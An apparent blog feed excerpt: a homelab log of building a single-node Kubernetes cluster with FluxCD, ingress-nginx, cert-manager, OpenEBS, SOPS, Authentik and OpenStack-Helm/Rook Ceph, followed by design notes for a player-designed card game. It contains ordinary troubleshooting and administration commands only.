<p>Except… not really. The port 80 and 443 are not used when I check <code>sudo ss -tulpn</code>, and if I curl either of those ports, it just times out. A relevant <a href="https://github.com/k3s-io/klipper-lb/issues/6">github issue</a> says that klipper has some problems with canal, and to enable <a href="https://docs.tigera.io/calico/latest/reference/configure-cni-plugins#container-settings">canal ip forwarding</a> in <code>/etc/cni/net.d/10-canal.conflist</code>.</p>
<p>However, despite doing this, and restarting, the ports are not in use, and the service times out if I try to curl my site.</p>
<p>But, traefik seems to be working, because if I use the <code>kubectl port-forward</code> command to port forward traefik to my local machine, I can curl it.</p>

<p>Although an interesting error, it’s possible that this isn’t <em>the</em> error that is irritating me. According to a <a href="https://github.com/rancher/rke2/issues/6528#issuecomment-2278536875">github issue comment</a>, RKE2 comes wtih “network policies” that can restrict traffic between pods, and that might be the issue.</p>
<p>However, on <a href="https://fluxcd.io/flux/installation/configuration/optional-components/#network-policies">according to the fluxcd documentation on networkpolicies</a>, fluxcd comes with rules that disallow traffic to the flux-system namepsace by default… which is where I was attempting to deploy my software.</p>
<p>So, after I change the configs to deploy traefik to the kubernetes <code>default</code> namespace:</p>
<div class="sourceCode" id="cb29" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb29-1">[moonpie@lizard traefik]$ curl moonpiedumpl.ing</span>
<span id="cb29-2">404 page not found</span></code></pre></div>
<p>It works!</p>
<p>Now, I need to find a test service to deploy. I deployed <a href="https://fluxcd.io/flux/get-started/#add-podinfo-repository-to-flux">podinfo</a>, because it is a simple web service, used as an example service for fluxcd.</p>
<p>Here was the ingress file that I used to expose it on &lt;podinfo.moonpiedumpl.ing&gt;</p>

<p>Not really simple, and it was a pain to edit because my editor (Kate), set tabs to 4 spaces, rather than two.</p>
<p>Now, how can I add HTTPS/TLS to this? Although <a href="https://doc.traefik.io/traefik/https/acme/#configuration-examples">Traefik documents how to enable acme in the first example</a>, however, the documentation on how to add this to each individual site is unclear.</p>
<p>Based on removing the annotation, and testing, it looks like the annoation isn’t needed. Also, it seems that the <code>kubectl explain ingress --recursive</code> explains the “ingress” kubernetes resource, which is above.</p>
<p>However, it seems that Traefik provides an “IngressRoute” resource, which is what they expect you to use for automatic https setups like what I am trying to do. But… I’m hesitant to rely on that, as “IngressRoute” seems to be traefik specific, rather than Ingress, which is general to kubernetes.</p>
<p>Actually, after doing more research, I’ve decided to switch to <a href="https://kubernetes.github.io/ingress-nginx/">ingress-nginx</a>. Unlike traefik, it seems to have build in support for <a href="https://kubernetes.github.io/ingress-nginx/examples/auth/oauth-external-auth/">external oauth authentication</a>. Although Traefik can do it, it’s not build in, and I would have to use a plugin.</p>
<p>So, this means I’m switching from Traefik to nginx and cert-manager instead.</p>
<section id="nginxcert-manager" class="level3">
<h3 class="anchored" data-anchor-id="nginxcert-manager">Nginx/Cert-Manager</h3>
<p>I followed the <a href="https://cert-manager.io/docs/installation/helm/">official cert-manager installation guide</a>, but converted it into flux configs.</p>

<p>One thing that I had to change is the values at the very bottom. It seems that the <code>--set crds.enabled=true</code> in the helm install command options doesn’t work for flux. Instead, I had to seperate it out to what is in the <code>values</code> section above.</p>
<p>I also deployed ingress-nginx:</p>

<p>Another thing I had to do was to uninstall traefik:</p>
<div class="sourceCode" id="cb35" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb35-1">[moonpie@lizard flux-config]$ kubectl delete helm</span>

<span id="cb35-5">helmrepository.source.toolkit.fluxcd.io "traefik" deleted</span></code></pre></div>
<p>For whatever reason, after deleting the traefik files from my git repo, they did not get removed from flux even after reconciling them. But, after this, the install works normally.</p>
<p>However, when I attempt to appy an ingress, I get an error:</p>
<div class="sourceCode" id="cb36" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb36-1">Warning: resource ingresses/podinfo is missing the kubectl.kubernetes.io/last-applied-configuration annotation which is required by kubectl apply. kubectl apply should only be used on resources created declaratively by either kubectl create --save-config or kubectl apply.

<p>This seems to be a sort of race condition, caused by when resources are simautaneously brought up, despite one depending on another. I found dsome relevant github issues.</p>
<p><a href="https://github.com/kubernetes/ingress-nginx/issues/5968" class="uri">https://github.com/kubernetes/ingress-nginx/issues/5968</a></p>
<p>There were some hacks related to deleting the hook, but I found in the <a href="https://github.com/kubernetes/ingress-nginx/tree/main/charts/ingress-nginx">helm chart documentation</a>, there is an official option to delete the hook. I set that:</p>

<p>I figured out why, somewhat. For some reason, it was using the traefik ingress class, despite the fact that I uninstalled traefik, and was using nginx. However, even after:</p>

<p>The “Ingress Class” is empty, when it probably needs to be filled with something. There are two solutions: I can set it manually, the exact field is ingress.spec.ingressClassName, or I can <a href="https://kubernetes.io/docs/concepts/services-networking/ingress/#default-ingress-class">set it an an ingressclass as a default</a>.</p>
<p>I edited the nginx helm release with more configuration:</p>
<div class="sourceCode" id="cb43" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb43-1">[moonpie@lizard flux-config]$ cat nginx/helmrelease.yaml</span>

<span id="cb43-23">        default: true</span></code></pre></div>
<p>And after this, I had to delete the podinfo ingress, and then recreate it, but it was working again. I wonder why it didn’t change the ingressclass when I reapplied the yaml file?</p>
<p>Now for TLS/HTTPS.</p>
<p>Well, TLS already kinda works. It’s just using kubernetes self signed cert, rather than a letsencrypt cert.</p>
<p><a href="https://cert-manager.io/docs/tutorials/acme/nginx-ingress/">Here is the doumentation on using cert-manager and nginx together</a>. They recommend using the <a href="https://letsencrypt.org/docs/challenge-types/#http-01-challenge">http01</a> (<a href="https://web.archive.org/web/20240930190112/https://cert-manager.io/docs/tutorials/acme/nginx-ingress/">archive</a>) challenge, but that method (or maybe just their method) does not work with wildcard domains.</p>
<blockquote class="blockquote">
<p>It is not possible to obtain certificates for wildcard domain names (e.g.&nbsp;<code>*.example.com</code>) using the HTTP01 challenge mechanism.</p>
</blockquote>
<p>From <code>kubectl explain issuer.spec.acme.solvers.http01</code>.</p>
<p>THe other thing I don’t like about that page, is that it suggests that to set the “ingressClassName”, but I don’t want to do that. What if I want to change ingresses later on, would I have to change every single issuer? I think I will just allow it to set it’s own default and hope for the best.</p>
<p>According the <a href="https://cert-manager.io/docs/configuration/acme/http01/">cert-manager docs for acme http01</a></p>
<blockquote class="blockquote">
<p>If class and ingressClassName are not specified, and name is also not specified, cert-manager will default to create new Ingress resources but will not set the ingress class on these resources, meaning all ingress controllers installed in your cluster will serve traffic for the challenge solver, potentially incurring additional cost.</p>
</blockquote>
<p>I should be able to not set this field. I played around a bit with leaving the fields blank, but it didn’t work. I had to actually create the field, and leave it blank.</p>

<p>So, I need to create a persistent volume of some kind, and then have it specifically reference the persistent volume claims that are used.</p>
<p>But… which provider do I use. Ideally, I want something similar to docker/podman volumes, where I don’t have to deal with mapping them to exact host paths. I also want these persistent volume claims to be automatically met, that is, dynamically provisioned storage.</p>
<p>I decided to use [openebs] for this.</p>
<p>Here are my flux configs:</p>

<p>I need to a set a version, but this deploys openebs for now. However, it doesn’t instantly work, because the openebs-hostpath provisioner is not set to the default for storage classes. But when I do, using <code>kubectl edit storageclass openebs-hostpath</code></p>

<p>After this, the Authentik server is up. But, it looks like a reclaim policy of “delete”, means that if I delete the Authentik helm chart, my user data will be deleted as well.</p>
<p>Instead, I think I need to manually create volumes in my flux config, that use “claimRef” to get claimed by the right PersistentVolumeClaims. Or maybe I can have openebs volumes retain themselves?</p>
<p>Actually, I think I need to <a href="https://openebs.io/docs/user-guides/local-storage-user-guide/local-pv-hostpath/hostpath-configuration">create another storageclass</a> that can dynamically provision volumes, but this one has the settings and specs I want, and is the default.</p>
<p>So, I did that:</p>

<p>And this works, including getting an SSL certificate from the letsencrypt-staging server.</p>
<p>Now I need to set up encryption of my secrets, because I want for this git repo to be public.</p>
</section>
<section id="secretssops" class="level3">
<h3 class="anchored" data-anchor-id="secretssops">Secrets/SOPS</h3>
<p>So, authentik looks difficult, because the helm chart requires quite a complex set of configurations, and I don’t want to put those in the same file for the helmrelease.</p>
<p>I think what I want to do is this: I should seperate out the authentik configs into a “ConfigMap”, which gets fed to the helm chart, and that will be one portion of the authentik config. The other portion will be a “Secret” which gets decrypted by fluxcd and sops.</p>
<ul>
<li><a href="https://fluxcd.io/flux/guides/mozilla-sops/">Fluxcd docs on sops</a> (I will be using age, since that’s what the sops docs recomment)</li>
<li><a href="https://fluxcd.io/flux/migration/helm-operator-migration/#configmap-and-secret-references">FLuxcd docs on configmap and secret references</a></li>
</ul>
<p>I started by following the <a href="https://fluxcd.io/flux/guides/mozilla-sops/">sops-age</a> guide.</p>
<p>So, here is the problem I am encountering. I want to encrypt only the relevant values, but a configmap or secret stores the entire secret means that I have to encrypt an entire set of data values.</p>
<p>I was hoping for something like this:</p>

<p>But, even after applying this, it still doesn’t work.</p>
<p><a href="https://blog.sldk.de/2021/03/handling-secrets-in-flux-v2-repositories-with-sops/">One relevant blog post</a> suggests making a similar edit… to the autogenerated flux yaml files.</p>
<p><a href="https://hackernoon.com/how-to-handle-kubernetes-secrets-with-argocd-and-sops-r92d3wt1">Another blog post</a> creates a custom argocd dockerfile…</p>
<p>According to a <a href="https://github.com/fluxcd/flux2/issues/4075">GitHub issue</a>, Flux does not, and will not support sops encryption of files directly. In fact, the user there claims that only secrets support decryption.</p>
<p>I think I need to separate out my sensitive data in to a secret, and then do sops on that secret. However, I’m confused on how to do this, especially since the fluxcd docs do not make it very clear.</p>
<p>I created a secret:</p>

<p>But one thing I really, really dislike about this setup is how I cannot encrypt just the values of the secrets I desire to encrypt. Instead, I am forced to encyrpt the whole yaml thing, which I think would make it difficult to rotate individual passwords/keys later on.</p>
<p>Is there a secret encryption/storing method that:</p>
<ul>
<li>Is minimal (no vault)</li>
<li>Runs locally (no GCP or AWS or other cloud services)</li>
<li>Securely stores individual keys</li>
</ul>
<p>But that’s off topic, back to sops.</p>
<p>I can encrypt this with:</p>

<p>After this, I need to change my original passwords to something more secure. So now, I need to reset the service.</p>

<p>After all of this, authentik is put up again. I created the initial default admin account (which you can do so by going to yoursite.com/if/flow/initial-setup/), and now I need to set up self enrollment.</p>
<p>I then followed the <a href="https://docs.goauthentik.io/docs/users-sources/user/invitations">authentik docs for setting up invitations</a>.</p>
<p>I got an error, though “No invitation stage is bound to any flow. Invitations will not work as expected.” To fix I had to follow steps from a <a href="https://github.com/goauthentik/authentik/issues/9719#issuecomment-2468981069">github issue</a></p>
<p>Except it’s like this:</p>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><img src="./projects/build-server-5/images/invite_bad.png" class="img-fluid figure-img"></p>
<figcaption>An image of the authentik invite page. The fields are in the order of “password”, “username”, and then “password (repeat)</figcaption>
</figure>
</div>
<p>I find this mildly annoying, but I also worry that this may hint at future problems. Authentik seems to be a <strong>very</strong> flexible piece of software.</p>
<p>Later on, I decided to move authentik to it’s own namespace, and replace Issuer with ClusterIssuers.</p>

<h2 class="anchored" data-anchor-id="static-site">Static Site</h2>
<p>I want to move my blog over to my own domain name. I think the easiest way to do this is. When <a href="https://quarto.org/">quarto</a>, the static site I use “publishes”, what it actually does is push a copy of the compiled static site to another git branch, gh-pages. Github automatically reads from that branch and serves the site at <code>*.github.io</code> domains.</p>
<p>I think I can do something similar with:</p>
<ul>
<li>Flux git source that automatically pulls from that same branch every so often</li>
<li>Web server that mounts the git repo as a volume and serves from it.</li>
</ul>
<p>There is also this <a href="https://git.gay/gitgay/pages-server">forgejo static site server</a>, but I’m not going to be looking at that for now.</p>
<p>I also am searching for some static site premade deployment that can pull from a helm chart.</p>
<ul>
<li><a href="https://gimlet.io/docs/frontend/static-site-deployment-tutorial">Gimlet</a> — this looks really complex, but looks like it does what I want.</li>
<li>some nginx + curl solution, <a href="https://github.com/redhat-cop/helm-charts/tree/main/charts/static-site" class="uri">https://github.com/redhat-cop/helm-charts/tree/main/charts/static-site</a>, <a href="https://artifacthub.io/packages/helm/redhat-cop/static-site">artifacthub</a> — I really like this solution, but it doesn’t seem to be maintained. Artifiacthub reports security vulnerabilities in the older containers used.</li>
</ul>
<p>Ah, I think I found something that works best: <a href="https://artifacthub.io/packages/helm/bitnami/nginx" class="uri">https://artifacthub.io/packages/helm/bitnami/nginx</a></p>
<p>It took some effort to figure this one out.</p>

<p>So apparently, when using OCI helm charts, the organization acts as the “repo”, where you get helm charts from.</p>

<p>And this works, although I’m unhappy that I can’t use a “latest” tag to automatically update to the latest version of the chart.</p>
<p>Also, the ingress created does not seem to have ssl set up properly. It has cert-manager’s local source, rather than the letsencrypt-staging for a source. But, the site is up on &lt;moonpiedumpl.ing&gt;. This is a lot simpler than some custom CI solution, and I suspect I can simply disable Github’s automatic static site generation from the branch, while still having quarto render my static site to the <code>gh-pages</code> branch.</p>
<p>This is probably because authentik and the bitnami helm nginx chart use differing values for their ingress configuration.</p>

<p>Forgejo has a helm chart</p>

<p>I don’t think I will be doing rootless, although that was my original plan.</p>
<p>Also, it looks like the forgejo helm chart has quite a bit of configuration options, including <code>gitea.oauth</code>, which I can probably use to configure</p>

<h2 class="anchored" data-anchor-id="openstack">Openstack</h2>
<p>I decided to use <a href="https://docs.openstack.org/openstack-helm/latest/readme.html">openstack-helm</a> for deployment, due to it’s declarative nature. Everything is helm charts, in a <a href="https://opendev.org/openstack/openstack-helm">git repo</a>.</p>
<ul>
<li>General parameters: <a href="https://docs.openstack.org/openstack-helm/latest/chart/index.html" class="uri">https://docs.openstack.org/openstack-helm/latest/chart/index.html</a></li>
</ul>
<p>There is a <a href="https://www.reddit.com/r/openstack/comments/1g1wt6u/looking_for_feedbacks_on_using_openstackhelm_with/">reddit post</a> about using Openstack helm with Gitops deployments, where I mention that searching github for <code>"kind: HelmRelease" path:*.y*ml "openstack"</code> gives me examples of openstack deployed using flux.</p>
<p><code>kubectl create namespace openstack</code></p>
<p>I decided to create a new namepsace for openstack, rather than putting everything in default. With authentik, I saw how it was somewhat difficult to delete all relevant persistent volumes, but deleting all resources of a type in a namespace is easy. Perhaps using the kubernetes “GUI” offered by the kubernetes vscode extension makes things easier.</p>
<p>Firstly: “By default OpenStack-Helm stateful sets expect to find a storage class named general.”</p>

<p>I then followed the Node Labels, step, but the taint step failed:</p>
<pre><code>[moonpie@lizard flux-config]$ kubectl taint nodes -l 'node-role.kubernetes.io/control-plane' node-role.kubernetes.io/control-plane-

<p>I’ll just skip it for now.</p>
<p>It took some fiddling, since I am converting the imperative steps but I figured out what to do.</p>
<pre><code>helm upgrade --install rabbitmq openstack-helm-infra/rabbitmq \
    --namespace=openstack \
    --set pod.replicas.server=1 \
    --timeout=600s \
    $(helm osh get-values-overrides -p ${OVERRIDES_DIR} -c rabbitmq ${FEATURES})

helm osh wait-for-pods openstack</code></pre>
<p>So at this step, rather than running the helm commands, I instead have to go to the <a href="https://opendev.org/openstack/openstack-helm-infra/src/branch/master/rabbitmq/values_overrides/2024.2-ubuntu_jammy.yaml">relevant file</a> in the overrides directory, and manually add those values to my helmrelease. I also investigated something automatically, like getting values from a url, but it looks more complicated than simply copying values over.</p>

<p>Most of openstack will be left alone done sequentially, but neutron will get it’s own section.</p>
<p><a href="https://docs.openstack.org/openstack-helm/latest/devref/networking.html">Openstack-helm Neutron Networking docs</a>. But this doesn’t list how I can set the interface that openstack uses for the networking.</p>
<p>I also found a very good <a href="https://github.com/beskar-cloud/beskar-flux/blob/master/apps/g2-oidc/03-openstack/03-openstack.base/06-keystone.yaml">example on github</a> which uses flux and openstack-helm to dpeloy openstack hooked up to OIDC.</p>
<p>Anyway, the big reason I am worried about neutron’s setup, is becaues I have a unique bridging setup. Openstack neutron requires it’s own bridge for external networking, but I only have a single physical interface. In a previous version of my openstack deployment, with kolla-ansible, I split the single network interface with the</p>
<p>However, it looks like openstack-helm <a href="https://github.com/openstack/openstack-helm/blob/7f82ce2556e283a47f8cc6f6cc3f3d0c9524e22a/doc/source/devref/networking.rst#L292">has an option to automatically add a bridge</a>.</p>
<p>However, it seems like I don’t want this setting, becasue it actually <a href="https://github.com/openstack/openstack-helm/blob/7f82ce2556e283a47f8cc6f6cc3f3d0c9524e22a/neutron/templates/bin/_neutron-bagpipe-bgp-init.sh.tpl#L24">adds a bridge using the ip command</a>. I already have a bridge setup, so I don’t want this.</p>
<p>I need to copy the kolla-ansible settings of <a href="https://github.com/openstack/kolla-ansible/blob/4e2af1872da2466843de1fa3ea639f2b79828663/ansible/roles/neutron/templates/linuxbridge_agent.ini.j2#L9">mapping neutron_external_interface</a> to an <code>physical_interface_mappings</code>, in the helm chart values.</p>
<p>Okay, it looks like <a href="https://opendev.org/openstack/openstack-helm/src/branch/master/neutron/values.yaml#L2095">openstack helm has an option to set <code>physical_interface_mappings</code></a>.</p>
<p>Given that I already have a bridge, I wonder if I can simply use that existing bridge as a linuxbridge? Or should I use [the veth trick again])https://moonpiedumplings.github.io/projects/build-server-2/#bridge-veth)</p>
<p>I’m going to do that again, since I know it works and I already have a bridge.</p>
<p><code>nmcli con add type veth ifname veth1 con-name veth1 veth.peer eth1</code> and add <code>veth1</code> to cockpit.</p>
<p>And then use <code>eth1</code> as my networking interface. This appears to work, as I can see my networking setup in horizon.</p>

<p>Looking at the secrets and the configmaps, there doesn’t appear to the <code>ceph-etc</code> or <code>ceph-keyring</code> secrets. They are not automatically created?</p>
<p>Oops, I forgot the <a href="https://docs.openstack.org/openstack-helm/latest/install/prerequisites.html">prerequisites</a>. You are supposed to install ceph <em>before</em> doing all of this.</p>
<p>Even after fixing this, I still need more work, to fix some things up. Apparantly, in the <a href="https://opendev.org/openstack/openstack-helm-infra/src/branch/master/tools/deployment/ceph/ceph-rook.sh">example deploy</a>, there are some setups that I don’t have.

<p>And when I attempt to add those variables to enable the toolbox, it still crashes because <a href="https://github.com/rook/rook/issues/2329">no serviceaccount is created</a>. It seems I should explicitly use a value, rather than allowing for the default.</p>

<p>Also, to delete the cluster properly, it has to have the dependents deleted.</p>
<p>After fixing this, I get another error:</p>

<p>So it looks like the rook ceph is not starting, meaning no mons/endpoints are started, leading to cascading failures in the rest of the system. I think the problem is that I don’t have a persistent volume that can offer block storage devices available, nor have I configured the ceph cluster to do this.</p>
<p><a href="https://rook.io/docs/rook/v1.16/CRDs/Cluster/pvc-cluster/">Ceph with K8s PVs</a>. <a href="https://openebs.io/docs/user-guides/local-storage-user-guide/local-pv-lvm/advanced-operations/lvm-raw-block-volume">And thankfully, openebs has docs on provisioning a raw block storageclass</a>.</p>
<p>No, it doesn’t seem to be that. Perhaps my issue is that I am attempting to create a ceph “cluster” on a single node. I found a <a href="https://www.rusinov.ie/en/posts/2020/setting-up-single-node-ceph-cluster-for-kubernetes/">relevant blogpost</a> (<a href="https://web.archive.org/web/20230201154957/https://www.rusinov.ie/en/posts/2020/setting-up-single-node-ceph-cluster-for-kubernetes/">archive</a>) about this.</p>
<p>Here’s <a href="https://medium.com/@satheesh.mohandass/installing-rook-ceph-for-persistent-storage-on-single-node-openshift-c1102a8ced40">another blog post</a>. There is also an <a href="https://rook.io/docs/rook/latest-release/Getting-Started/example-configurations/#cluster-crd">offical test cluster</a>.</p>
<p>I attempted to deploy the test cluster:</p>
<div class="sourceCode" id="cb79" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb79-1">kubectl apply -f https://raw.githubusercontent.com/rook/rook/refs/heads/release-1.16/deploy/examples/cluster-test.yaml</span></code></pre></div>
<p>And… nothing seems to happen. No pods being created. No deployments being done. Nothing. It’s partially because I didn’t clean up properly. According to <a href="https://brettweir.com/blog/remove-rook-from-cluster/">another blog post</a> you have to edit the finalizers on the ceph storage resources (cephblockpool, etc), and set them to null in order for them to get deleted.</p>
<p>So I recently went to <a href="../../blog/scale-22/">scale</a> and:</p>
<blockquote class="blockquote">
<p>I went to the first meeting, and was immediately introduced to an interesting software — <a href="https://docs.rackspacecloud.com/genestack-components/">genestack</a>. Unlike openstack helm, it doesn’t seem to <em>require</em> rook ceph, despite being a kubernetes deployment, which makes it very appealing. Currently, I am attempting to deploy Openstack on my single Kubernetes server, using FluxCD and Openstack-helm, but I am encountering a blockage because ceph doesn’t like being deployed on a single node.</p>
</blockquote>
<p>I am looking into the <a href="https://github.com/rackerlabs/genestack/">genestack</a> code to figure out how they did it, but haven’t spotted much yet, except for:</p>

<p>It seems to be possible to set this value to something other than the “ceph” it is set to in the official openstack-helm repo… but there is no documentation on this. Looking at the code of glance, however:</p>

<p>So maybe there is some kind of standardized interface, which people can select storage options for openstack? But I don’t see anything like that in the code for Openstack-Helm Cinder.</p>
<p>I should also take a look at StarlingX, since that also seems to be able to do a single node ceph install.</p>

<p>It seems that my attempts to change the number of monitors and managers to one is failing. Actually, upon further inspection, it seems to initially have the number correct, but then later changes it to be wrong.</p>
<p>Note for the future: Rook Operator and Rook ceph cluster helm charts don’t seem to sync versions with the actual ceph software.</p>

► cloning branch "main" from Git repository "ssh://moonpie@moonpiedumpl.ing:22022/home/moonpie/flux-config"
✔ cloned repository
► generating component manifests
✔ generated component manifests
✔ component manifests are up to date
► installing components in "flux-system" namespace
✗ timeout waiting for: [CustomResourceDefinition/helmreleases.helm.toolkit.fluxcd.io status: 'Terminating', CustomResourceDefinition/kustomizations.kustomize.toolkit.fluxcd.io status: 'Terminating']</code></pre>
<p>I ended up uninstalling and reinstalling kubernetes. But in the future, I should consider using RKE2’s <a href="https://docs.rke2.io/datastore/backup_restore">built in snapshots</a>.</p>

  <title>The Ultimate Card Game</title>
  <link>./playground/cardgame/</link>
  <description><![CDATA[ 





<section id="design-goals" class="level1">
<h1>Design Goals</h1>
<p>The overview, is that this is a card game where players design the cards. Limitless freedom, in terms of strategies and synergies that can be used, and simple mechanics that balloon into uncalculable complexities.</p>
<p>This card game is a 2+ player, dueling/combat card game similar to MTG/yugioh, with resources management mechanics as well.</p>
<p>One thing I want to do is to not have a colored mana system, but instead take advantage of the resources that the game gives you to form “color”.</p>
<p>Resources (used to do stuff):</p>
<ul>
<li>Mana/Production (can cast from life)
<ul>
<li>Life</li>
</ul></li>
<li>Cards in hand (artificially increased by scry)
<ul>
<li>Draw counts</li>
</ul></li>
<li>Cards on field</li>
<li>Cards in graveyard</li>
<li>Board space?</li>
</ul>
<p>I want synergy to happen, but for the synergy to use up one of the other resources, preventing snowballing / an infinite combo.</p>
<p>The other thing I want is to fix issues with interactivity, which are one of the complaints about MTG. To fix this, I will have a tactical “battlefield” during the attak/defense phases, where card positioning is on a hex grid and all “enchantment” or “resource generation” type cards can be attacked or defended. The goal of this is to prevent setups where one player is more focused on playing solitaire instead of dueling other players.</p>
<p>In addition to this, I would like to incentivize <em>actions</em>, rather than <em>state</em>. The problem with incentivizing state via something like rewarding having cards in the graveyard, is that players want to play those cards.</p>
</section>
<section id="game-setuplayout" class="level1">
<h1>Game Setup/Layout</h1>
<p>Traditional Deck + Hand style. How many in a hand? I’m thinking 7.</p>
<p>Players start with no mana, but can spend from life</p>
<p>Life: Players start with 16 life Life can also be used to cast cards, which is basically the only way to cast cards before “factory” type cards are on the field or via 0 or negative cost cards.</p>
<p>During the “block” phase of an attack, the blocking player can either cast 0 (or negative) cost cards, or cast cards using life. This makes cards effectively “instants”, allowing players to bring stuff on the field at the opponent turn, but at some price, as the cards must be either &lt; 0 cost or paid with life.</p>
<p>Cards play in their “stunned” state. AkA: cards cannot attack first turn after playing (Might change if I adjust how cards do damage)</p>
<p>Players can pay production to nerf cards. It costs X * N where N is the total amount of aspect points a card has in that aspect, to reduce that aspect by one. N does not change. So to completeley destroy a 3 health card, it costs 27 production points. To remove one of an 8 aspect card, it’s 8 production points, 2 is 16, etc.</p>
<section id="gamemodes" class="level2">
<h2 class="anchored" data-anchor-id="gamemodes">Gamemodes:</h2>
<p>Best of 1, 16 life.</p>
<p>Best of 3, 16 life.</p>
<p>Alternate: Half of cards in graveyard go to exile, the other half go to the bottom of the players deck. Either completely random, pseudorandom, or complete player choice. Note: why is this better than multiple rounds? This could also be a seperate gamemode.</p>
<p>Players have no life, but instead have a shared number line that acts as life. But, if the players have a certain difference between their opponent, then they lose. This difference starts as 2^32 or some other arbitrarily high power of two. But, it halves with every turn (or maybe every half turn?), eventually reducing itself down to one where it stays there.</p>
<p>C*mmander: Players get to start with a 64 (more than legendary, or maybe 128) value card on the board. If it dies they lose? Or maybe they can recast it and they have player life.</p>

<section id="card-design" class="level1 page-columns page-full">
<h1>Card Design</h1>
<p>For card design, there where be a point system, where each card costs points to create on the</p>
<p>Rarity system:</p>
<p>Legendary: 32 + cost</p>
<p>Epic: 16 + cost</p>
<p>Rare: 8 + cost</p>
<p>Common: 4 + cost</p>
<p>30 cards in a deck</p>
<p>Card ratios must be: (minimum 15/30 cards, probably 30)</p>
<p>2 legendaries, 4 epic, 8 rare, and 16 common for 30 total. You can have more, but you must maintain that ratio.</p>
<p>Negative cost cards give player production points to use, in addition to being instants.</p>
<p>Attack/defense:</p>
<p>5 card draws at the beginning of the turn: Can be used instead to the card effect.</p>
<p>Cards:</p>
<hr>
<p>Card name, mana cost</p>
<p>Poorly drawn image</p>
<p>Detail text/keywords</p>
<p>Flavor text</p>
<p>————- Attack Power/Health/Production power</p>
<p>Alternate Card design:</p>
<p>Card Name</p>
<p>Either under or next to name: base costs + addons – (negative production cost increaste) – rarity cost add = mana/production cost</p>
<p>attack/ power, vertically down the left side of the card</p>
<p>(number) Card trait</p>
<p>Flavor text</p>
<p>Card “Shop”</p>
<p>Traits cost Trait Number * N where N is the total amount of traits</p>

<section id="defensive-aspects" class="level2">
<h2 class="anchored" data-anchor-id="defensive-aspects">Defensive Aspects:</h2>
<p><strong>Health</strong>: Base + X Give this card health trait and 1 + X hit points. (note: If a card has no health, it disappears at the end of a turn).</p>
<p><strong>Multi Block</strong>: 1 + X block more than one attacker of a target, per target blocked, up to 2 + X</p>
<p><strong>Multi-Target-Block</strong>: 1 + X: Block for more than one card, although only one attacker per target, up to 2 + X stacks with multi block with</p>
<p><strong>Anti-AoE</strong>: Base:1 + X add this cards health power to hower many</p>
<p><strong>Merged Block</strong>: Base:1 + X: This card can do a merged block, which is mostly treated as one block. The health of merged blockers is “pooled” where they all share damage. To kill all cards in the merged block, and attacker must outdamage the pool. (Should merged block allow merging of traits?) (and should merged block allow blocking multi-block?)</p>
<p>Idea: No merging of traits. Stacks with other defensive traits. Allows for multi-blocking, of one card, but doesn’t</p>
<p><strong>Collective Block</strong>: 1 + X. If multiple cards are blocking one card, they gain a “health” pool, where they all share damage. To kill all cards pooling cards, they must deal enough damage to overcome the “health pool” This card can pool with X cards. Cannot health pool with cards with greater health than itself. Blocking is treated as a merged block, where something like “damage multiplication” can split up the health pool again.</p>
<p>Do I want collective block to merge traits as well?</p>
<p><strong>Shield</strong>: X: Card gets a seperate “shield of X hit points. If they are damaged by one attack/encounter, it doesn’t rollover into their HP. Opponent(s) can pay production points to reduce the shield value. Shield points can also be spent to reduce active effects</p>
<p>Goals: Replace mtg keywork indestructuble. Replace clash royale shield mechanic Maybe replace hexproof with a resist spell mechanic?</p>
<p><strong>Spellshield</strong>: X : X : For every X spell effects applied to it, it is only influenced by (X - 1 / X) of them. E.g: spellshield 2 means that it halves spell effects applied. 3 means it 1/3rds them and so on. This can be reduced by paying production (?)</p>

<ul>
<li>So the idea behind “actives” is that they generate points/tokens that can be spent on things — but don’t have to be spent. The actives that cost production to use, only cost production on the application of the active, rather than the generation/creation of the points.</li>
</ul>
<p><strong>Mana Generation</strong>: X: X * N . Generate mana for casting things</p>
<p>Give opponent production points: Goal: replicate elixir golem mechanic from clash royale. Problems: Too weak. Decks which use less or no production won’t be affected by this. Needs an alternate ability along with give opponent production points, such as giving opponent another active.</p>
<p><strong>Stealth</strong>: Base:1 + X Take 1 + X cards off the field… and then put them back on face down in new spots. Stealthed cards are revealed when they take action, attack, or are dealt damage. Stealth can also be used to move around cards during the blocking phase.</p>
<p>Cost:</p>
<p>Goal: Twofold: Obscure cards on board, but also allow to move cards in blocking (or attacking?) phases around. Blue idea, playing with information</p>
<p><strong>Necromancy</strong>: Base:1 + X Search 1 + X through the bottom of the deck/graveyard. Cast a cards base cost, rather than their total creation point cost.</p>
<p>Goal: Play the roal of black deck, bringing cards back from the dead. Replace mtg https://mtg.fandom.com/wiki/List_of_Magic_slang#Recursion recursion</p>
<p><strong>Tutor</strong>: Cost Base:1 + X, look at the top X cards of your deck and show them to your oppnent. You can cast directly from these cards. Problem: Recursive scry/tutor too op</p>
<p>Goal: Play the role of blue deck, increasing options player has.</p>
<p><strong>Polarity Reversal</strong>: X: Change offensive abilities to their defensive equivalents defensive and vice versa, of a single card, up to X * N of a single trait</p>
<p>Goal: Buff and nerf at the same time. Can be used to reduce health, or increase attack.</p>
<p><strong>Counterspell</strong>: Base:1 + X: You “take control” of 1 + X “spell” aspects targeting individual things. Problem: How will counterspell and react phases work? Do I want this? It adds extra complexity to casting. Idea: Counter either 1 + X damage/protection/production (distributed) or 1 + X spell effects targeting stuff.</p>
<p>Goal: play the role of the blue counterspell, while also allowing them to deny production points</p>
<p><strong>Replicate</strong>: X: Duplicate active effects, excluding replicate effects. Can duplicate opponents effects, or own. Can replicate counterspell.</p>
<p><strong>Aspect Enhancement</strong>: X: Enhance any aspect of card(s) up to X. Costs (initial aspect cost) + X * N production points. * Having this cost mana is kinda weak.</p>
<p><strong>Gain Life</strong>: X: X and pay X production points to do so</p>
<p><strong>Deny attackers</strong>. Some kind of stop attacker from attacking mechanic.</p>
<p>Also want active?</p>
<p>I want some kind of burn effect/direct damage, without it being broken.</p>
<p><strong>Burn/Direct damage</strong>: X: X: Deal direct damage to opponent, but this requires that you must pay production for each damage done, and damage is limited by defensive cards under your cards along the path.</p>
